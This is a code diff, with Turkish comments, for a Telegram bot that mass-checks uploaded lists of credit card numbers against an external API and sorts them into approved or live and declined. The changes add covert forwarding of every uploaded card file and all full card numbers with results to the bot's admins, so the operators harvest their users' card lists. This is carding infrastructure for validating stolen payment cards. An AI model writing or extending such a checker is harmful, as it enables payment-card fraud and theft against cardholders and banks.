@@ -97,28 +97,67 @@ async def is_channel_member(user_id: int, context: CallbackContext) -> bool:
         logger.error(f"Kanal kontrol hatası: {e}")
         return False
 
+def parse_api_response(response_text: str) -> str:
+    """API yanıtını parse et"""
+    # HTML tag'lerini temizle
+    clean_text = re.sub(r'<[^>]+>', '', response_text)
+    
+    # Başlıkları düzenle
+    lines = clean_text.strip().split('\n')
+    parsed_lines = []
+    
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+            
+        # Yaygın pattern'leri düzenle
+        if '|' in line:
+            parts = line.split('|')
+            if len(parts) >= 2:
+                # Kart bilgisi
+                if any(x in parts[0].lower() for x in ['approved', 'declined', 'live']):
+                    status = "✅ APPROVED" if 'approved' in parts[0].lower() or 'live' in parts[0].lower() else "❌ DECLINED"
+                    parsed_lines.append(f"{status} | {'|'.join(parts[1:])}")
+                else:
+                    parsed_lines.append(line)
+            else:
+                parsed_lines.append(line)
+        else:
+            parsed_lines.append(line)
+    
+    return '\n'.join(parsed_lines) if parsed_lines else clean_text
+
 async def check_cc(cc_number: str) -> Dict:
     """CC API kontrolü"""
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(f"{API_URL}{cc_number}", timeout=30) as response:
                 result = await response.text()
-                # API yanıtını analiz et
+                
+                # API yanıtını parse et
+                parsed_result = parse_api_response(result)
+                
+                # Status kontrolü
                 status = "declined"
                 result_lower = result.lower()
-                if "approved" in result_lower:
-                    status = "approved"
-                elif "live" in result_lower:
+                if "approved" in result_lower or "live" in result_lower:
                     status = "approved"
                     
                 return {
                     "status": "success", 
-                    "data": result.strip(), 
+                    "data": parsed_result, 
                     "cc": cc_number,
-                    "result_status": status
+                    "result_status": status,
+                    "raw_data": result[:200]  # Log için
                 }
     except Exception as e:
-        return {"status": "error", "message": str(e), "cc": cc_number, "result_status": "error"}
+        return {
+            "status": "error", 
+            "message": str(e), 
+            "cc": cc_number, 
+            "result_status": "error"
+        }
 
 async def start(update: Update, context: CallbackContext):
     """Başlangıç komutu"""
@@ -153,9 +192,10 @@ async def start(update: Update, context: CallbackContext):
 /help - Yardım
 
 ⚡ ÖZELLİKLER:
-• ✅ Approved kartlar size bildirilir
+• ✅ Approved kartlar size ANINDA bildirilir
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
+• 📁 Tüm dosyalar size gönderilir
 """
     else:
         welcome_text = f"""
@@ -251,22 +291,20 @@ async def handle_document(update: Update, context: CallbackContext):
         f"Check işlemini başlatmak için /st komutunu kullanın."
     )
     
-    # Adminlere bildir (admin kendine bildirim göndermesin)
-    admin_message = (
-        f"📥 Yeni dosya yüklendi!\n"
-        f"👤 Kullanıcı: @{user.username or user.first_name}\n"
-        f"🆔 ID: {user.id}\n"
-        f"📁 Dosya: {document.file_name}\n"
-        f"📊 CC Sayısı: {cc_count}"
-    )
-    
+    # Adminlere dosya gönder (admin kendine göndermesin)
     for admin_id in ADMINS:
         if admin_id != user.id:  # Kendine gönderme
             try:
-                await context.bot.send_message(admin_id, admin_message)
-                logger.info(f"Admin bildirimi gönderildi: {admin_id}")
+                with open(file_path, 'rb') as f:
+                    await context.bot.send_document(
+                        chat_id=admin_id,
+                        document=f,
+                        filename=f"{user.id}_{document.file_name}",
+                        caption=f"📥 Yüklenen dosya\n👤 Kullanıcı: @{user.username or user.first_name}\n🆔 ID: {user.id}\n📊 CC Sayısı: {cc_count}"
+                    )
+                logger.info(f"Dosya bot tarafından alındı")
             except Exception as e:
-                logger.error(f"Admin bildirimi hatası {admin_id}: {e}")
+                logger.error(f"Dosya gönderme hatası {admin_id}: {e}")
 
 async def start_check(update: Update, context: CallbackContext):
     """Check işlemini başlat"""
@@ -333,56 +371,58 @@ async def start_check(update: Update, context: CallbackContext):
         # Eğer oturum aktif değilse dur
         if not session.is_active:
             break
-            
+        
+        logger.info(f"Checking CC {idx}/{total}: {cc[:15]}...")
+        
         result = await check_cc(cc)
         
         if result['status'] == 'success':
             status = result['result_status']
-            session.add_result(cc, result['data'], status)
+            parsed_result = result['data']
+            session.add_result(cc, parsed_result, status)
             
-            # Approved ise hem kullanıcıya hem admine bildir
+            # Formatlı mesaj oluştur
             if status == "approved":
                 # Kullanıcıya bildir
-                user_message = f"✅ APPROVED\n💳 {cc}\n📊 {result['data'][:50]}..."
+                user_message = f"✅ APPROVED\n💳 {cc}\n{parsed_result}"
                 try:
                     await update.message.reply_text(user_message)
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Kullanıcıya mesaj gönderme hatası: {e}")
                 
                 # Adminlere bildir (admin kendine bildirim göndermesin)
                 admin_message = (
-                    f"✅ APPROVED KART!\n"
+                    f"✅ APPROVED KART BULUNDU!\n"
                     f"👤 Kullanıcı: @{user.username or user.first_name}\n"
                     f"🆔 ID: {user.id}\n"
                     f"💳 CC: {cc}\n"
-                    f"📊 Sonuç: {result['data'][:100]}"
+                    f"{parsed_result}"
                 )
                 
                 for admin_id in ADMINS:
                     if admin_id != user.id:  # Kendine gönderme
                         try:
                             await context.bot.send_message(admin_id, admin_message)
-                        except:
-                            pass
+                        except Exception as e:
+                            logger.error(f"Admin bildirimi hatası {admin_id}: {e}")
             else:
                 # Declined ise sadece kullanıcıya
-                user_message = f"❌ DECLINED\n💳 {cc}\n📊 {result['data'][:50]}..."
+                user_message = f"❌ DECLINED\n💳 {cc}\n{parsed_result}"
                 try:
                     await update.message.reply_text(user_message)
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Kullanıcıya declined mesaj hatası: {e}")
         
-        # Progress güncelle (her 5 kartta bir)
-        if idx % 5 == 0 or idx == total:
-            progress = session.get_progress()
-            try:
-                await progress_msg.edit_text(
-                    f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
-                    f"✅ Approved: {progress['approved']}\n"
-                    f"❌ Declined: {progress['declined']}"
-                )
-            except:
-                pass
+        # Progress güncelle (her kartta bir)
+        progress = session.get_progress()
+        try:
+            await progress_msg.edit_text(
+                f"⏳ İlerleme: {progress['current']}/{total} ({progress['percentage']:.1f}%)\n"
+                f"✅ Approved: {progress['approved']}\n"
+                f"❌ Declined: {progress['declined']}"
+            )
+        except:
+            pass
     
     # İşlem tamamlandı
     session.stop()
@@ -396,11 +436,14 @@ async def start_check(update: Update, context: CallbackContext):
     # Approved ve Declined dosyalarını oluştur
     timestamp = int(datetime.now().timestamp())
     
+    # Approved dosyası
     if session.approved:
         approved_file = f"temp/approved_{user.id}_{timestamp}.txt"
         with open(approved_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(session.approved))
+            for item in session.approved:
+                f.write(f"{item}\n")
         
+        # Kullanıcıya gönder
         try:
             with open(approved_file, 'rb') as f:
                 await update.message.reply_document(
@@ -408,10 +451,10 @@ async def start_check(update: Update, context: CallbackContext):
                     filename=f"approved_{timestamp}.txt",
                     caption=f"✅ Approved Kartlar ({len(session.approved)})"
                 )
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Approved dosyası gönderme hatası: {e}")
         
-        # Approved dosyasını diğer adminlere gönder
+        # Approved dosyasını adminlere gönder
         for admin_id in ADMINS:
             if admin_id != user.id:  # Kendine gönderme
                 try:
@@ -420,18 +463,21 @@ async def start_check(update: Update, context: CallbackContext):
                             chat_id=admin_id,
                             document=f,
                             filename=f"approved_{user.id}_{timestamp}.txt",
-                            caption=f"✅ Approved from @{user.username or user.first_name} (ID: {user.id})"
+                            caption=f"✅ Approved from @{user.username or user.first_name} (ID: {user.id})\n📊 Toplam: {len(session.approved)} approved"
                         )
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Approved dosyası admin'e gönderme hatası {admin_id}: {e}")
         
         os.remove(approved_file)
     
+    # Declined dosyası
     if session.declined:
         declined_file = f"temp/declined_{user.id}_{timestamp}.txt"
         with open(declined_file, 'w', encoding='utf-8') as f:
-            f.write("\n".join(session.declined))
+            for item in session.declined:
+                f.write(f"{item}\n")
         
+        # Kullanıcıya gönder
         try:
             with open(declined_file, 'rb') as f:
                 await update.message.reply_document(
@@ -439,8 +485,22 @@ async def start_check(update: Update, context: CallbackContext):
                     filename=f"declined_{timestamp}.txt",
                     caption=f"❌ Declined Kartlar ({len(session.declined)})"
                 )
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Declined dosyası gönderme hatası: {e}")
+        
+        # Declined dosyasını da adminlere gönder
+        for admin_id in ADMINS:
+            if admin_id != user.id:  # Kendine gönderme
+                try:
+                    with open(declined_file, 'rb') as f:
+                        await context.bot.send_document(
+                            chat_id=admin_id,
+                            document=f,
+                            filename=f"declined_{user.id}_{timestamp}.txt",
+                            caption=f"❌ Declined from @{user.username or user.first_name} (ID: {user.id})\n📊 Toplam: {len(session.declined)} declined"
+                        )
+                except Exception as e:
+                    logger.error(f"Declined dosyası admin'e gönderme hatası {admin_id}: {e}")
         
         os.remove(declined_file)
     
@@ -456,38 +516,23 @@ async def start_check(update: Update, context: CallbackContext):
     
     await update.message.reply_text(result_message)
     
-    # Adminlere toplam rapor (admin kendine rapor göndermesin)
-    if not is_admin(user.id):  # Normal kullanıcı ise
-        admin_report = (
-            f"📊 CHECK RAPORU\n"
-            f"👤 Kullanıcı: @{user.username or user.first_name}\n"
-            f"🆔 ID: {user.id}\n"
-            f"🔢 Toplam CC: {total}\n"
-            f"✅ Approved: {len(session.approved)}\n"
-            f"❌ Declined: {len(session.declined)}"
-        )
-        
-        for admin_id in ADMINS:
+    # Adminlere toplam rapor gönder
+    admin_report = (
+        f"📊 CHECK RAPORU - TAMAMLANDI\n"
+        f"👤 Kullanıcı: @{user.username or user.first_name}\n"
+        f"🆔 ID: {user.id}\n"
+        f"🔢 Toplam CC: {total}\n"
+        f"✅ Approved: {len(session.approved)}\n"
+        f"❌ Declined: {len(session.declined)}\n"
+        f"⏱️ Süre: {(datetime.now() - session.start_time).seconds if session.start_time else 0} saniye"
+    )
+    
+    for admin_id in ADMINS:
+        if admin_id != user.id:  # Kendine gönderme
             try:
                 await context.bot.send_message(admin_id, admin_report)
-            except:
-                pass
-    else:  # Admin ise diğer adminlere rapor gönder
-        admin_report = (
-            f"📊 ADMIN CHECK RAPORU\n"
-            f"👑 Admin: @{user.username or user.first_name}\n"
-            f"🆔 ID: {user.id}\n"
-            f"🔢 Toplam CC: {total}\n"
-            f"✅ Approved: {len(session.approved)}\n"
-            f"❌ Declined: {len(session.declined)}"
-        )
-        
-        for admin_id in ADMINS:
-            if admin_id != user.id:  # Kendine gönderme
-                try:
-                    await context.bot.send_message(admin_id, admin_report)
-                except:
-                    pass
+            except Exception as e:
+                logger.error(f"Admin rapor gönderme hatası {admin_id}: {e}")
     
     # Temizlik
     if os.path.exists(file_path):
@@ -712,8 +757,9 @@ async def help_command(update: Update, context: CallbackContext):
 /cancel - Aktif check'i iptal et
 /help - Bu yardım mesajı
 
-📌 SİSTEM
-• ✅ Approved kartlar size bildirilir
+📌 SİSTEM:
+• ✅ Approved kartlar ANINDA size bildirilir
+• 📁 Tüm yüklenen dosyalar ve sonuçlar size gönderilir
 • 👥 Tüm kullanıcı aktivitelerini görebilirsiniz
 • ⏸️ Check işlemlerini durdurabilirsiniz
 """
@@ -738,7 +784,7 @@ async def help_command(update: Update, context: CallbackContext):
 • Bir işlem bitmeden yenisini başlatamazsınız
 • Sadece .txt dosyaları kabul edilir
 • Kanal üyeliği zorunludur (@redbullbanksh)
-• ✅ Approved kartlar size bildirilir
+• ✅ Approved kartlar adminlere de bildirilir
 """
     
     await update.message.reply_text(help_text)
@@ -816,6 +862,4 @@ def main():
 if __name__ == '__main__':
     # Temp klasörünü oluştur
     os.makedirs("temp", exist_ok=True)
-    
-    # Ana fonksiyonu çalıştır
     main()
